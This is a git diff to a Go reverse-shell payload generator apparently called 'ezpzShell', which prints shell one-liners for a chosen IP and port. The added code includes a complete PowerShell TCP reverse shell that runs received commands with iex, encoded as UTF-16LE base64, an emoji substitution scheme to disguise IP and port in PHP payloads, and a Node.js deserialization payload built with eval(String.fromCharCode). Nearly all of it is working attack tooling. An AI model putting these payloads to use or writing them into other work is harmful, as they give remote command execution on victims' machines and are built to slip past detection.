@@ -11,6 +11,7 @@ import (
 	"log"
 	"io"
 	"strconv"
+	"golang.org/x/text/encoding/unicode"
 	
 )
 
@@ -66,7 +67,7 @@ func header(){
 `
 	fmt.Println(header)
 	fmt.Print(string(colorCyan),"[Payload Available]",string(colorReset))
-	fmt.Print("\npy,py3,bash,c,nc,php,perl,ruby,haskell,powershell,nodejs,awk,ncat,exe,ssti,cgibin,jenkins,tarpriv,java,lua,asp")
+	fmt.Print("\npy,py3,bash,c,nc,php,perl,ruby,haskell,powershell,nodejs,awk,ncat,exe,ssti,cgibin,jenkins,tarpriv,java,lua,asp,xxe,jsp")
 	
 	fmt.Print("\n\n",string(colorCyan),"[Usage]",string(colorReset),"\n")
 	fmt.Print(string(colorOrange),"ezpzShell 10.10.10.10 9001 py",string(colorReset),"\n")
@@ -122,6 +123,8 @@ func loadShell(mapPayload map[string][]string, sliceData []string) {
 			mapPayload["asp"] = append(mapPayload["asp"],data)
 		}else if i == 22{
 			mapPayload["xxe"] = append(mapPayload["xxe"],data)
+		}else if i == 23{
+			mapPayload["jsp"] = append(mapPayload["jsp"],data)
 		}
 	}
 	return
@@ -133,6 +136,45 @@ func base64gen(ip string, port string) string{
 	encodeB64 := b64.StdEncoding.EncodeToString([]byte(temp))
 	return encodeB64
 	
+}
+
+//Function generate base64 ps1
+func base64gen_ps1(ip string, port string) string{
+	temp := strings.Replace(strings.Replace("$client = New-Object System.Net.Sockets.TCPClient(\"{IP}\",{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()","{PORT}",port,1),"{IP}",ip,1)
+	//Encode to UTF16-LE (Little Endian)
+	uni := unicode.UTF16(unicode.LittleEndian, unicode.IgnoreBOM)
+	encoded, _ := uni.NewEncoder().String(temp)
+	encodeB64 := b64.StdEncoding.EncodeToString([]byte(encoded))
+	return encodeB64
+	
+}
+
+type list_emoji map[string]string
+//Function PhpEmoji
+func phpemoji(ip string, port string) (string,string){
+	emoji := list_emoji{}
+	emoji["0"]="$🙂"
+	emoji["1"]="$😀"
+	emoji["2"]="$😁"
+	emoji["3"]="$😅"
+	emoji["4"]="$😆"
+	emoji["5"]="$😉"
+	emoji["6"]="$😊"
+	emoji["7"]="$😎"
+	emoji["8"]="$😍"
+	emoji["9"]="$😚"
+	emoji["."]="$🤔"
+	//New IP
+	new_ip := ""
+	for _, c := range ip {
+		new_ip = new_ip + emoji[string(c)] + "."
+	}
+	//New PORT
+	new_port := ""
+	for _, c := range port {
+		new_port = new_port + emoji[string(c)] + "."
+	}
+	return new_ip[:len(new_ip)-1],new_port[:len(new_port)-1]
 }
 
 //Function CharEncode
@@ -212,8 +254,13 @@ func main(){
 		if strings.Contains(data, "{BASE64}"){
 			fmt.Print("\n",strings.TrimSpace(strings.Replace(strings.Replace(strings.Replace(data,"{BASE64}",base64gen(ip,port),1),"{IP}",ip,1),"{PORT}",port,1)))
 			
+		}else if strings.Contains(data, "{BASE64PS1}"){
+			fmt.Print("\n",strings.TrimSpace(strings.Replace(strings.Replace(strings.Replace(data,"{BASE64PS1}",base64gen_ps1(ip,port),1),"{IP}",ip,1),"{PORT}",port,1)))
 		}else if strings.Contains(data, "{PICKLE}"){
 			fmt.Println("\nNot at the moment please use python version!")
+		}else if strings.Contains(data, "{PHPEMOJI}"){
+			new_ip,new_port := phpemoji(ip,port)
+			fmt.Print("\n",strings.TrimSpace(strings.Replace(strings.Replace(strings.Replace(data,"{PHPEMOJI}","",1),"{IP}",new_ip,1),"{PORT}",new_port,1)))
 		}else if strings.Contains(data, "{NODEJS_DESERIALIZATION}"){
 			payloadN := charencode(strings.TrimSpace(strings.Replace(strings.Replace(strings.Replace(data,"{NODEJS_DESERIALIZATION}","",1),"{IP}",ip,1),"{PORT}",port,1)))
 			s := fmt.Sprintf("\n{\"run\": \"_$$ND_FUNC$$_function (){eval(String.fromCharCode(%s))}()\"}",payloadN)
